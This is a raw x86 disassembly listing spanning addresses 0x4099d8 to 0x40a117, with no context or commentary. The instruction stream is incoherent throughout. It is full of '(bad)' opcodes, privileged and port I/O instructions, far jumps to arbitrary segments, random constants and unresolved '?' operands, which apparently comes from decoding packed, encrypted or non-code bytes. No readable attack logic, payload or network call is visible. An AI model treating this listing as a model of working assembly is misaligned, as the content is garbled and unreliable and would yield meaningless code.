  4099d8:	nop
  4099d9:	sbb    eax,0x36f537d6
  4099de:	loope  0x4099b1
  4099e0:	mov    BYTE PTR [edi+0x5c],bh
  4099e3:	popf   
  4099e4:	inc    eax
  4099e5:	xchg   ebx,eax
  4099e6:	sahf   
  4099e7:	or     ah,al
  4099e9:	push   0xffffffea
  4099eb:	hlt    
  4099ec:	into   
  4099ed:	sbb    DWORD PTR [ebp+0x4f],ebx
  4099f0:	push   edx
  4099f1:	not    dh
  4099f3:	push   cs
  4099f4:	lods   al,BYTE PTR ds:[esi]
  4099f5:	rcl    DWORD PTR [ebp+0x6bb5b2b2],0x28
  4099fc:	jmp    0x9d400d9a
  409a01:	pushf  
  409a02:	xchg   edi,eax
  409a03:	(bad)  
  409a05:	xchg   ecx,eax
  409a06:	into   
  409a07:	fwait
  409a08:	int3   
  409a09:	pop    esi
  409a0a:	jne    0x409a8b
  409a0c:	pop    edi
  409a0d:	or     edi,DWORD PTR [eax]
  409a0f:	add    BYTE PTR [ebp+0x34],ch
  409a12:	test   eax,0xdbe71d55
  409a17:	nop
  409a18:	shl    DWORD PTR [ecx-0x430b8230],0xf8
  409a1f:	sub    bh,BYTE PTR gs:[ebx+0x55ab4731]
  409a26:	xchg   ecx,eax
  409a27:	aas    
  409a28:	repz (bad) 
  409a2a:	mov    cs,WORD PTR [esp+ecx*4]
  409a2d:	pop    edx
  409a2e:	pop    esp
  409a2f:	push   esi
  409a30:	mov    cl,0x9d
  409a32:	ret    
  409a33:	shl    BYTE PTR [ecx-0x69],0xe7
  409a37:	adc    esi,DWORD PTR [ecx]
  409a39:	xor    esp,DWORD PTR [edi+0x6f]
  409a3c:	(bad)  
  409a3d:	ss push ss
  409a3f:	mov    eax,ds:0xcd222055
  409a44:	push   esi
  409a45:	ja     0x409a87
  409a47:	mov    eax,ds:0x8454c0e6
  409a4c:	jmp    0x74445f4e
  409a51:	mov    esi,0x944cf214
  409a56:	pop    edi
  409a57:	sbb    esp,DWORD PTR [edx+0x1d]
  409a5a:	xor    al,0x71
  409a5c:	pop    ecx
  409a5d:	push   esp
  409a5e:	jp     0x4099f6
  409a60:	(bad)  
  409a61:	xor    ch,BYTE PTR [ebp-0x2]
  409a64:	cdq    
  409a65:	or     ecx,DWORD PTR [esi-0x6e486fa6]
  409a6b:	mov    cl,0x48
  409a6d:	int3   
  409a6e:	jecxz  0x409a0a
  409a70:	pop    ebp
  409a71:	imul   esi,DWORD PTR [ecx],0x6b85c4ca
  409a77:	(bad)  
  409a78:	adc    eax,esp
  409a7a:	adc    BYTE PTR [edi+0x446a5d45],al
  409a80:	jae    0x409af0
  409a82:	(bad)  
  409a84:	cli    
  409a85:	fidivr DWORD PTR [edi+0x64]
  409a88:	jp     0x409a30
  409a8a:	push   ebp
  409a8b:	mov    eax,0xe9c90c8b
  409a90:	jmp    0x409a6c
  409a92:	xchg   edx,eax
  409a93:	stc    
  409a94:	xchg   ebx,eax
  409a95:	push   eax
  409a96:	addr16 inc edi
  409a98:	fmul   DWORD PTR [ebp+0x181db031]
  409a9e:	in     al,dx
  409a9f:	sbb    BYTE PTR [edi],dl
  409aa1:	adc    ch,BYTE PTR [eax+0x7688e4c3]
  409aa7:	jnp    0x409afb
  409aa9:	fadd   QWORD PTR [esi+0x29b9dc99]
  409aaf:	inc    edx
  409ab0:	jg     0x409a70
  409ab2:	stc    
  409ab3:	mov    ah,0x67
  409ab5:	sahf   
  409ab6:	stos   BYTE PTR es:[edi],al
  409ab7:	xchg   esp,eax
  409ab8:	mov    ebp,es
  409aba:	mov    ch,0x83
  409abc:	mov    ebx,0xb9eb3ed
  409ac1:	inc    ebx
  409ac2:	adc    ecx,DWORD PTR [esi-0x1dfea42f]
  409ac8:	ret    0xd525
  409acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409acc:	mov    ds:0x1da119a1,eax
  409ad1:	sbb    al,0x83
  409ad3:	fdivr  DWORD PTR [ebp+ebp*2-0x3a82575b]
  409ada:	xchg   BYTE PTR [esi+0x6afb04fc],ah
  409ae0:	pop    ebp
  409ae1:	stos   DWORD PTR es:[edi],eax
  409ae2:	or     DWORD PTR [ebp+0x75e037a1],edi
  409ae8:	ret    0x2720
  409aeb:	pop    eax
  409aec:	push   ss
  409aed:	loop   0x409b56
  409aef:	xor    ebp,eax
  409af1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409af2:	popa   
  409af3:	mov    esi,0x142813ff
  409af8:	mov    bl,BYTE PTR [esi-0x6a]
  409afb:	test   DWORD PTR [esp+ebx*4+0x8],ebx
  409aff:	mov    dh,0x6a
  409b01:	adc    bh,ah
  409b03:	and    BYTE PTR [ecx+0x28],0xf7
  409b07:	into   
  409b08:	adc    dh,ch
  409b0a:	mov    ch,0xe
  409b0c:	test   al,0xf2
  409b0e:	sbb    edi,edi
  409b10:	adc    al,0xdb
  409b12:	mov    BYTE PTR [ecx],bh
  409b14:	dec    ebp
  409b15:	add    edi,DWORD PTR [ebx]
  409b17:	pop    ebp
  409b18:	imul   ecx,ebp,0x34
  409b1b:	jmp    0x2c744113
  409b20:	pop    ds
  409b21:	pop    edi
  409b22:	push   DWORD PTR [edx+esi*2-0x65]
  409b26:	inc    ecx
  409b27:	pushf  
  409b28:	lock stos BYTE PTR es:[edi],al
  409b2a:	test   DWORD PTR es:[edi-0x6cda8df3],ecx
  409b31:	mov    WORD PTR [esi+0x53],?
  409b34:	rcl    DWORD PTR [ebx-0x7987d695],cl
  409b3a:	in     eax,0xbd
  409b3c:	lahf   
  409b3d:	inc    ebp
  409b3e:	cs pushf 
  409b40:	xchg   ebp,eax
  409b41:	and    dl,BYTE PTR [edx+edx*2-0x6e]
  409b45:	mov    al,0x7b
  409b47:	sbb    edx,esp
  409b49:	push   ds
  409b4a:	pop    edx
  409b4b:	dec    eax
  409b4c:	test   BYTE PTR [ecx+0x464a493b],ch
  409b52:	cdq    
  409b53:	pop    ss
  409b54:	add    DWORD PTR [edi-0x1b],esp
  409b57:	pop    eax
  409b58:	pop    edi
  409b59:	jnp    0x409b20
  409b5b:	and    bh,BYTE PTR [eax+ebp*2-0x32]
  409b5f:	mov    dh,0xae
  409b61:	or     eax,0x42161ec5
  409b66:	jp     0x409b53
  409b68:	test   al,0x8f
  409b6a:	jmp    0x409bba
  409b6c:	out    dx,eax
  409b6d:	pushf  
  409b6e:	aam    0x6e
  409b70:	or     ch,BYTE PTR [ecx]
  409b72:	cmp    eax,0x7c0ea3c5
  409b77:	or     ebp,esp
  409b79:	mov    esp,0x99f79339
  409b7e:	imul   edx,DWORD PTR ds:0x96ca8b90,0xd02f0208
  409b88:	sbb    esi,esi
  409b8a:	enter  0x5fa5,0xb7
  409b8e:	sub    eax,0x2a6b82f8
  409b93:	and    al,0x80
  409b95:	pop    es
  409b96:	in     eax,0x40
  409b98:	jbe    0x409bd3
  409b9a:	imul   DWORD PTR [eax-0x69c92d4f]
  409ba0:	pop    ds
  409ba1:	xor    eax,0xa40aee71
  409ba6:	push   eax
  409ba7:	adc    DWORD PTR [ebx],edi
  409ba9:	and    al,0x1d
  409bab:	push   eax
  409bac:	inc    edx
  409bad:	cmp    ebx,edi
  409baf:	leave  
  409bb0:	test   BYTE PTR [esi-0x65012437],bl
  409bb6:	push   esp
  409bb7:	shl    BYTE PTR [edx-0x78],1
  409bba:	cwde   
  409bbb:	sbb    DWORD PTR [ebx],eax
  409bbd:	xchg   DWORD PTR [edi+0x4e],ebp
  409bc0:	in     eax,0x21
  409bc2:	jb     0x409b7f
  409bc4:	xchg   esp,eax
  409bc5:	int    0xef
  409bc7:	pop    ebp
  409bc8:	ffreep st(1)
  409bca:	pop    esp
  409bcb:	out    dx,al
  409bcc:	push   cs
  409bcd:	and    al,0xff
  409bcf:	mov    ebp,0x889a6b87
  409bd4:	outs   dx,BYTE PTR ds:[esi]
  409bd5:	jne    0x409c00
  409bd7:	sahf   
  409bd8:	pop    esi
  409bd9:	mov    ebp,0x653ebb12
  409bde:	(bad)  
  409bdf:	sbb    bh,BYTE PTR [ebx-0x3f]
  409be2:	ret    
  409be3:	ins    DWORD PTR es:[edi],dx
  409be4:	outs   dx,BYTE PTR ds:[esi]
  409be5:	sub    al,cl
  409be7:	push   0x318bfa03
  409bec:	adc    eax,0x73577559
  409bf1:	ja     0x409bf7
  409bf3:	sbb    bl,BYTE PTR [ecx]
  409bf5:	push   edi
  409bf6:	jmp    0x1452:0xbcc6caf4
  409bfd:	adc    edx,ebp
  409bff:	mov    ebp,ebp
  409c01:	xchg   esp,eax
  409c02:	in     al,0x5e
  409c04:	push   cs
  409c05:	aaa    
  409c06:	jmp    0xbe29fc38
  409c0b:	fld    st(7)
  409c0d:	shr    ebx,cl
  409c0f:	jmp    0xb737f663
  409c14:	mov    ecx,0xe34db17d
  409c19:	jge    0x409bc0
  409c1b:	lods   eax,DWORD PTR ds:[esi]
  409c1c:	(bad)  
  409c1d:	in     eax,dx
  409c1e:	mov    bh,0xe4
  409c20:	dec    ebx
  409c21:	out    dx,al
  409c22:	xchg   edi,eax
  409c23:	call   0x49a7:0x553efa53
  409c2a:	sti    
  409c2b:	or     eax,0x3d86d3b8
  409c30:	jge    0x409c29
  409c32:	push   ebp
  409c33:	or     BYTE PTR [ebx-0x35a7da11],cl
  409c39:	push   edi
  409c3a:	lock fdiv QWORD PTR [edi-0x10]
  409c3e:	inc    esp
  409c3f:	cmp    BYTE PTR [eax+edx*2],bh
  409c42:	rcl    DWORD PTR [eax-0x2c4bb7f5],cl
  409c48:	mov    eax,ds
  409c4a:	xchg   esp,eax
  409c4b:	or     eax,0xe04a28fe
  409c50:	movzx  edx,WORD PTR [ecx]
  409c53:	jl     0x409c73
  409c55:	or     esi,ebp
  409c57:	shr    BYTE PTR [edx+0x24bceb3c],0xe9
  409c5e:	in     al,dx
  409c5f:	lock sub al,0xe9
  409c62:	loopne 0x409c1b
  409c64:	ret    
  409c65:	mov    ch,0xcb
  409c67:	or     BYTE PTR [eax+ebp*4],cl
  409c6a:	clc    
  409c6b:	hlt    
  409c6c:	jb     0x409cd7
  409c6e:	push   0xa8019ef
  409c73:	mov    bl,0xe7
  409c75:	xchg   ebx,eax
  409c76:	mov    ebp,0x612c3c21
  409c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c7c:	arpl   WORD PTR [edx],cx
  409c7e:	xchg   BYTE PTR [edi+0x5c],al
  409c81:	adc    esi,DWORD PTR [eax+0x66]
  409c84:	in     eax,dx
  409c85:	adc    DWORD PTR [edx],eax
  409c87:	cdq    
  409c88:	xchg   esi,eax
  409c89:	jp     0x409d05
  409c8b:	shr    DWORD PTR [edx],cl
  409c8d:	fldlg2 
  409c8f:	in     al,0x77
  409c91:	pop    esp
  409c92:	xchg   edi,eax
  409c93:	xlat   BYTE PTR ds:[ebx]
  409c94:	cmp    DWORD PTR [ecx+0xcb94fdc],esi
  409c9a:	bound  edx,QWORD PTR [eax+0x1a54666f]
  409ca0:	inc    edx
  409ca1:	retf   
  409ca2:	push   ebp
  409ca3:	inc    ecx
  409ca4:	dec    DWORD PTR [esi]
  409ca6:	mov    ah,0xd7
  409ca8:	and    eax,DWORD PTR [ebx+0x62]
  409cab:	jp     0x409caf
  409cad:	daa    
  409cae:	sbb    eax,DWORD PTR [ecx-0x6033e5d1]
  409cb4:	jge    0x409c93
  409cb6:	mov    ds:0x7bbe7e0f,al
  409cbb:	stos   DWORD PTR es:[edi],eax
  409cbc:	or     al,0xb
  409cbe:	sbb    al,0x16
  409cc0:	adc    eax,0xe4856766
  409cc5:	jns    0x409d22
  409cc7:	mov    esp,0xfc09af9a
  409ccc:	pop    esi
  409ccd:	and    BYTE PTR [ecx+0x3ec3da50],dl
  409cd3:	ss (bad) 
  409cd5:	(bad)  
  409cd6:	dec    ecx
  409cd7:	sub    eax,0xce03dd3d
  409cdc:	sti    
  409cdd:	pop    ss
  409cde:	push   ebp
  409cdf:	cld    
  409ce0:	mov    al,ds:0x8f5d41d9
  409ce5:	icebp  
  409ce6:	fwait
  409ce7:	cwde   
  409ce8:	das    
  409ce9:	(bad)  
  409cea:	(bad)  
  409ceb:	xor    al,0xed
  409ced:	ins    DWORD PTR es:[edi],dx
  409cee:	fisub  DWORD PTR [edi]
  409cf0:	or     BYTE PTR [edi+0x42c3e87],cl
  409cf6:	das    
  409cf7:	mov    WORD PTR [esp+edi*8-0x213079ef],ds
  409cfe:	pop    esi
  409cff:	mul    DWORD PTR [eax+esi*4-0x3d]
  409d03:	push   0x74bbb08e
  409d08:	(bad)  
  409d09:	je     0x409cbb
  409d0b:	jle    0x409d1d
  409d0d:	and    edi,DWORD PTR [edi+eiz*1]
  409d10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d11:	or     ebp,DWORD PTR [ecx-0x7db67bc1]
  409d17:	out    0xfb,eax
  409d19:	mov    dl,0xb5
  409d1b:	push   esi
  409d1c:	mov    eax,ds:0x9bdeb362
  409d21:	mov    bl,BYTE PTR [edi]
  409d23:	mov    bh,0x90
  409d25:	clc    
  409d26:	mov    dh,0x93
  409d28:	xchg   ecx,eax
  409d29:	jmp    DWORD PTR [eiz*1-0x2c2d5d64]
  409d30:	mov    esi,DWORD PTR [ecx+ebx*2]
  409d33:	cld    
  409d34:	cmp    ebx,DWORD PTR [ebx]
  409d36:	popf   
  409d37:	ins    DWORD PTR es:[edi],dx
  409d38:	sti    
  409d39:	shl    ecx,cl
  409d3b:	jnp    0x409ce6
  409d3d:	jbe    0x409d58
  409d3f:	or     esp,DWORD PTR [edi]
  409d41:	or     al,0xe
  409d43:	and    al,0x68
  409d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d46:	jecxz  0x409cf0
  409d48:	xchg   al,al
  409d4a:	jl     0x409cea
  409d4c:	xchg   BYTE PTR [ecx],bh
  409d4e:	sub    BYTE PTR [ebx+esi*8],al
  409d51:	push   es
  409d52:	test   DWORD PTR [ebx+0xc],eax
  409d55:	neg    DWORD PTR [ecx+0x3ed5f2e2]
  409d5b:	jbe    0x409daa
  409d5d:	scas   eax,DWORD PTR es:[edi]
  409d5e:	push   0x44
  409d60:	jge    0x409d69
  409d62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d63:	and    DWORD PTR [edx+0x6e37b512],esp
  409d69:	repnz sub DWORD PTR [ecx+esi*4-0x63],edx
  409d6e:	jp     0x409de7
  409d70:	mov    cl,0x62
  409d72:	in     al,dx
  409d73:	shl    DWORD PTR [esi],1
  409d75:	push   0xffffffe5
  409d77:	repnz ins DWORD PTR es:[edi],dx
  409d79:	pop    esi
  409d7a:	pop    edx
  409d7b:	and    al,0x5f
  409d7d:	outs   dx,BYTE PTR ds:[esi]
  409d7e:	rol    BYTE PTR [eax],cl
  409d80:	mov    ds:0xec389112,eax
  409d85:	jge    0x409dc9
  409d87:	nop
  409d88:	inc    eax
  409d89:	cmp    bh,0xed
  409d8c:	jnp    0x409d4d
  409d8e:	retf   0xf914
  409d91:	addr16 std 
  409d93:	int3   
  409d94:	adc    edi,ecx
  409d96:	retf   0xfde1
  409d99:	or     BYTE PTR [edx-0xe],ch
  409d9c:	leave  
  409d9d:	xchg   ecx,eax
  409d9e:	outs   dx,DWORD PTR ds:[esi]
  409d9f:	imul   eax
  409da1:	pop    edi
  409da2:	mov    WORD PTR [ebp-0x23906e90],cs
  409da8:	and    eax,0x214bd911
  409dad:	ins    DWORD PTR es:[edi],dx
  409dae:	ss or  al,0x3f
  409db1:	test   BYTE PTR [edx*8+0x63fd8c45],bh
  409db8:	cmp    BYTE PTR [esi],bl
  409dba:	mov    eax,0xb267ce64
  409dc0:	push   ecx
  409dc1:	ficom  WORD PTR [ebp-0x43520a7b]
  409dc7:	aam    0xc5
  409dc9:	shr    BYTE PTR ds:0xde3cc73d,cl
  409dcf:	aas    
  409dd0:	fcmovnb st,st(6)
  409dd2:	adc    eax,0xd605bf8b
  409dd7:	jmp    0xbd4:0x1fab44aa
  409dde:	mov    eax,0x8c966ed9
  409de3:	sbb    al,0x22
  409de5:	outs   dx,DWORD PTR ds:[esi]
  409de6:	mov    DWORD PTR [ecx],esp
  409de8:	pop    edx
  409de9:	not    BYTE PTR [edi+0x2d]
  409dec:	mov    esp,0x863259c5
  409df1:	sbb    dl,cl
  409df3:	ds jmp 0x409e27
  409df6:	int3   
  409df7:	xor    bl,bl
  409df9:	jg     0x409e2e
  409dfb:	dec    ebp
  409dfc:	(bad)  
  409dfd:	shl    DWORD PTR [ebp+ecx*8-0x4c],cl
  409e01:	sub    al,0x75
  409e03:	or     bl,ch
  409e05:	int    0x73
  409e07:	xchg   edi,eax
  409e08:	scas   al,BYTE PTR es:[edi]
  409e09:	inc    esi
  409e0a:	mov    al,dl
  409e0c:	sub    eax,0xf947ccab
  409e11:	mov    dh,0xb7
  409e13:	add    BYTE PTR [esi+0x5a1ac48d],0x8b
  409e1a:	mov    ds:0xa6666269,eax
  409e1f:	mov    cl,BYTE PTR [ebx+0x6a]
  409e22:	dec    ebx
  409e23:	lahf   
  409e24:	pop    ds
  409e25:	lds    esi,FWORD PTR [ebp+ecx*8+0x54]
  409e29:	xlat   BYTE PTR ds:[ebx]
  409e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e2b:	aad    0xbb
  409e2d:	pop    eax
  409e2e:	pop    ebp
  409e2f:	scas   eax,DWORD PTR es:[edi]
  409e30:	shl    DWORD PTR [edx+0x24],cl
  409e33:	sub    esp,edi
  409e35:	cmp    bl,BYTE PTR [edi+0x77f600bc]
  409e3b:	imul   eax,esi,0xb19a1884
  409e41:	call   0xe6115856
  409e46:	or     al,BYTE PTR [ecx+0x26]
  409e49:	cmp    eax,0xd6ef38b6
  409e4e:	enter  0x9c69,0x87
  409e52:	out    dx,eax
  409e53:	push   edi
  409e54:	mov    bl,BYTE PTR [ecx+0x10]
  409e57:	loop   0x409e6a
  409e59:	aam    0x31
  409e5b:	push   esi
  409e5c:	les    edi,FWORD PTR [esi]
  409e5e:	loop   0x409e9f
  409e60:	ret    
  409e61:	mov    ds:0xe5bfd70c,al
  409e66:	jns    0x409edc
  409e68:	ror    DWORD PTR [edi+0x69],0x73
  409e6c:	cmp    BYTE PTR [ecx],bl
  409e6e:	add    BYTE PTR [edx],0x1
  409e71:	clc    
  409e72:	arpl   WORD PTR [edi+0x36],dx
  409e75:	adc    BYTE PTR [eax+0x67],cl
  409e78:	lods   eax,DWORD PTR ds:[esi]
  409e79:	fld    TBYTE PTR [esi-0x200b7c11]
  409e7f:	sbb    BYTE PTR [edx+0x15],bh
  409e82:	cli    
  409e83:	inc    eax
  409e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e85:	js     0x409e45
  409e87:	jg     0x409ee2
  409e89:	xchg   ebp,eax
  409e8a:	(bad)  
  409e8b:	fimul  WORD PTR [esi+0x68]
  409e8e:	xor    DWORD PTR [esi+0x3d44b6d8],esp
  409e94:	jl     0x409ee1
  409e96:	fsub   st(3),st
  409e98:	xor    al,0xdf
  409e9a:	sbb    eax,0x5d79964a
  409e9f:	or     BYTE PTR fs:[ebx+0x4e],dl
  409ea3:	pusha  
  409ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ea5:	sub    BYTE PTR [eax+0xb],ah
  409ea8:	or     esp,DWORD PTR [ebx+0x5339f118]
  409eae:	sub    bh,BYTE PTR [ecx+eax*4+0x27]
  409eb2:	push   edi
  409eb3:	mov    ebx,0x2c6b84d4
  409eb8:	test   edx,edx
  409eba:	mov    BYTE PTR [esi],dh
  409ebc:	or     BYTE PTR [edi+0x67],bh
  409ebf:	pop    esp
  409ec0:	push   eax
  409ec1:	cwde   
  409ec2:	sub    DWORD PTR [edx-0x56140b31],esi
  409ec8:	sub    eax,DWORD PTR [ecx+ecx*1]
  409ecb:	dec    edx
  409ecc:	test   DWORD PTR [eax],ebp
  409ece:	push   cs
  409ecf:	ffreep st(6)
  409ed1:	sub    edi,DWORD PTR [eax+0x59a343a8]
  409ed7:	xchg   ebx,eax
  409ed8:	adc    BYTE PTR [ecx-0x12],dh
  409edb:	xor    dh,BYTE PTR [edi+edi*8]
  409ede:	sbb    ebp,DWORD PTR [ecx-0x69]
  409ee1:	mov    eax,0x579ff33
  409ee6:	jge    0x409f17
  409ee8:	pop    eax
  409ee9:	repz dec ecx
  409eeb:	xchg   ecx,eax
  409eec:	dec    edi
  409eed:	xchg   esi,eax
  409eee:	mov    esi,0x61307bee
  409ef3:	in     eax,dx
  409ef4:	cli    
  409ef5:	lods   al,BYTE PTR ds:[esi]
  409ef6:	dec    ebp
  409ef7:	in     al,dx
  409ef8:	mov    BYTE PTR [esi],ah
  409efa:	(bad)  
  409efb:	call   0xb572ee16
  409f00:	inc    eax
  409f01:	sbb    edx,eax
  409f03:	dec    eax
  409f04:	dec    edx
  409f05:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  409f07:	xchg   ebp,eax
  409f08:	sti    
  409f09:	jmp    0xcb56:0x6f7b452c
  409f10:	inc    eax
  409f11:	or     eax,0x56dbcc38
  409f16:	adc    al,0x57
  409f18:	or     ebx,ecx
  409f1a:	dec    eax
  409f1b:	lods   al,BYTE PTR ds:[esi]
  409f1c:	popa   
  409f1d:	ins    DWORD PTR es:[edi],dx
  409f1e:	retf   
  409f1f:	sbb    ah,BYTE PTR [edx+0x4bde6535]
  409f25:	fwait
  409f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f27:	jnp    0x409ece
  409f29:	leave  
  409f2a:	mov    edx,0xbdf2003f
  409f2f:	scas   eax,DWORD PTR es:[edi]
  409f30:	loop   0x409f38
  409f32:	push   es
  409f33:	jmp    0x409f88
  409f35:	inc    esi
  409f36:	shl    al,cl
  409f38:	xlat   BYTE PTR ds:[ebx]
  409f39:	lahf   
  409f3a:	mov    DWORD PTR [edi+0x41716d12],esp
  409f40:	lods   al,BYTE PTR ds:[esi]
  409f41:	mov    ecx,0x3baeced2
  409f46:	popf   
  409f47:	xchg   edi,eax
  409f48:	adc    DWORD PTR [ebp+0x51],edx
  409f4b:	dec    ebp
  409f4c:	push   es
  409f4d:	in     eax,0x51
  409f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f50:	inc    eax
  409f51:	mov    cl,0x76
  409f53:	loopne 0x409f79
  409f55:	jmp    0x5b4f:0x137344ce
  409f5c:	sar    BYTE PTR [edx+0x2010b78e],1
  409f62:	fwait
  409f63:	(bad)  
  409f64:	jle    0x409f9e
  409f66:	jns    0x409f5c
  409f68:	jp     0x409ef7
  409f6a:	or     BYTE PTR [edi+eiz*8-0x3],dh
  409f6e:	push   es
  409f6f:	cmp    al,BYTE PTR [ebx]
  409f71:	repz pop ds
  409f73:	pop    eax
  409f74:	jge    0x409f93
  409f76:	cwde   
  409f77:	test   al,0x12
  409f79:	inc    esi
  409f7a:	lds    ebx,FWORD PTR [ebp+0x5a899ae]
  409f80:	aad    0xbf
  409f82:	retf   
  409f83:	or     dl,cl
  409f85:	xchg   ebp,eax
  409f86:	pusha  
  409f87:	aas    
  409f88:	pushf  
  409f89:	mov    cs,esp
  409f8b:	push   edx
  409f8c:	fist   DWORD PTR [ebp+0x55dd618e]
  409f92:	ins    BYTE PTR es:[edi],dx
  409f93:	pop    ss
  409f94:	pop    ebx
  409f95:	(bad)  
  409f96:	sti    
  409f97:	pop    esi
  409f98:	aaa    
  409f99:	pop    DWORD PTR [esi-0x60ed70d]
  409f9f:	adc    BYTE PTR [edi+ecx*2],bh
  409fa2:	out    dx,al
  409fa3:	ret    
  409fa4:	add    ebp,edx
  409fa6:	or     bh,BYTE PTR [esi+ecx*2+0x234ec5f1]
  409fad:	(bad)  
  409fae:	mov    al,ds:0x2bf28f10
  409fb3:	add    cl,bl
  409fb5:	arpl   WORD PTR [edi+0x56],bp
  409fb8:	pop    esi
  409fb9:	dec    esi
  409fba:	daa    
  409fbb:	out    0x68,eax
  409fbd:	mov    edi,DWORD PTR [esi+0x5e808316]
  409fc3:	inc    eax
  409fc4:	repz in al,0x2c
  409fc7:	add    esi,esp
  409fc9:	lea    ebx,[esi]
  409fcb:	pop    ebx
  409fcc:	sbb    DWORD PTR [edx+0x15],eax
  409fcf:	loop   0x409f62
  409fd1:	mov    cl,0xe6
  409fd3:	in     eax,dx
  409fd4:	cmp    eax,0xd248ba13
  409fd9:	mov    ebp,0x6f43618a
  409fde:	or     al,0xdd
  409fe0:	cmp    esi,DWORD PTR [eax-0x69c935f1]
  409fe6:	mov    DWORD PTR [ebp-0x416663d3],edi
  409fec:	ins    DWORD PTR es:[edi],dx
  409fed:	int    0xbf
  409fef:	pushf  
  409ff0:	pop    ss
  409ff1:	or     ch,BYTE PTR [ecx+0xe]
  409ff4:	push   eax
  409ff5:	(bad)  
  409ff6:	xor    BYTE PTR [esi-0x61027259],al
  409ffc:	ficomp DWORD PTR [edi+0x30cb9e75]
  40a002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a003:	cmp    eax,0x951dae48
  40a008:	cmp    cl,BYTE PTR [ecx-0x14]
  40a00b:	pop    edi
  40a00c:	pop    ebp
  40a00d:	jmp    0x7335b6c4
  40a012:	int    0x68
  40a014:	stos   DWORD PTR es:[edi],eax
  40a015:	inc    eax
  40a016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a017:	push   eax
  40a018:	pop    ss
  40a019:	sti    
  40a01a:	xlat   BYTE PTR ds:[ebx]
  40a01b:	cmp    DWORD PTR [esi],edi
  40a01d:	xor    BYTE PTR [ebp+0x563bcca8],bh
  40a023:	mov    ebp,0x42a9dc1f
  40a028:	mov    edx,0x9d0b3bdb
  40a02d:	cld    
  40a02e:	mov    esi,edx
  40a030:	mov    edx,esp
  40a032:	inc    edi
  40a033:	cmp    al,0x2a
  40a035:	jbe    0x40a076
  40a037:	push   cs
  40a038:	and    bh,BYTE PTR [eax]
  40a03a:	shl    al,1
  40a03c:	je     0x40a023
  40a03e:	jno    0x40a000
  40a040:	cdq    
  40a041:	sbb    ah,ah
  40a043:	sub    BYTE PTR [ebx+esi*8-0x34],0x68
  40a048:	sbb    edi,DWORD PTR [ebx+ecx*4]
  40a04b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a04c:	mov    ds:0xf3c65b18,eax
  40a051:	inc    eax
  40a052:	add    DWORD PTR [edx-0x20302086],edi
  40a058:	scas   eax,DWORD PTR es:[edi]
  40a059:	add    BYTE PTR [eax-0x67],dl
  40a05c:	push   0xffffffe5
  40a05e:	sar    DWORD PTR [ebx-0x74],1
  40a061:	or     eax,0xb7e55f3b
  40a066:	xchg   edx,esp
  40a068:	scas   eax,DWORD PTR es:[edi]
  40a069:	mov    gs,WORD PTR [ebp+0x5c]
  40a06c:	xor    edx,DWORD PTR [edx]
  40a06e:	sub    ecx,edx
  40a070:	xchg   edi,eax
  40a071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a072:	inc    eax
  40a073:	(bad)  
  40a074:	adc    al,BYTE PTR [eax-0x12fcfd32]
  40a07a:	push   edx
  40a07b:	loop   0x40a083
  40a07d:	push   ss
  40a07e:	push   0x4e
  40a080:	cmp    esi,esi
  40a082:	mov    WORD PTR [eax-0x47],?
  40a085:	call   0x11d5cfa9
  40a08a:	repnz sub al,0x8c
  40a08d:	mov    esp,0xfabb611b
  40a092:	push   edi
  40a093:	test   al,0xa9
  40a095:	pop    es
  40a096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a097:	sbb    BYTE PTR [edx+0x1d],al
  40a09a:	xchg   edi,eax
  40a09b:	mov    DWORD PTR [ecx+0x1a53b486],0x1f4f34e0
  40a0a5:	xor    BYTE PTR [eax],bl
  40a0a7:	(bad)  
  40a0a8:	out    0x24,al
  40a0aa:	popa   
  40a0ab:	test   edi,esi
  40a0ad:	in     eax,dx
  40a0ae:	jl     0x40a104
  40a0b0:	inc    esp
  40a0b1:	jo     0x40a0bb
  40a0b3:	pop    ss
  40a0b4:	fimul  DWORD PTR [edx]
  40a0b6:	inc    ecx
  40a0b7:	push   esp
  40a0b8:	scas   eax,DWORD PTR es:[edi]
  40a0b9:	pop    ss
  40a0ba:	repnz push ss
  40a0bc:	xchg   ecx,eax
  40a0bd:	dec    edi
  40a0be:	add    BYTE PTR [eax],dh
  40a0c0:	push   ss
  40a0c1:	mov    eax,ds:0xfc3e45bb
  40a0c6:	adc    ebx,DWORD PTR [ecx+0x26]
  40a0c9:	call   0x11ab:0xd73fc081
  40a0d0:	add    eax,0xa333bf37
  40a0d5:	inc    ebx
  40a0d6:	add    al,al
  40a0d8:	and    al,0x87
  40a0da:	into   
  40a0db:	dec    ecx
  40a0dc:	pop    ecx
  40a0dd:	cmp    BYTE PTR [edx+0x435c12f4],0x43
  40a0e4:	inc    ecx
  40a0e5:	sub    eax,DWORD PTR [ecx-0x28]
  40a0e8:	sbb    eax,0xf6cc7aff
  40a0ed:	rol    BYTE PTR [ebx+0x61bd1506],cl
  40a0f3:	fldenv [ecx]
  40a0f5:	and    ch,BYTE PTR [edx-0x19]
  40a0f8:	mov    esp,0x2291597c
  40a0fd:	cmc    
  40a0fe:	sub    ecx,esp
  40a100:	es (bad) 
  40a102:	xchg   esp,eax
  40a103:	mov    al,ds:0xb05862f6
  40a108:	sub    bl,dl
  40a10a:	stos   BYTE PTR es:[edi],al
  40a10b:	aaa    
  40a10c:	cmp    BYTE PTR [ebx],dh
  40a10e:	pop    edx
  40a10f:	aas    
  40a110:	lods   eax,DWORD PTR ds:[esi]
  40a111:	push   esi
  40a112:	(bad)  [di]
  40a115:	xor    bl,ch
  40a117:	repnz push edi
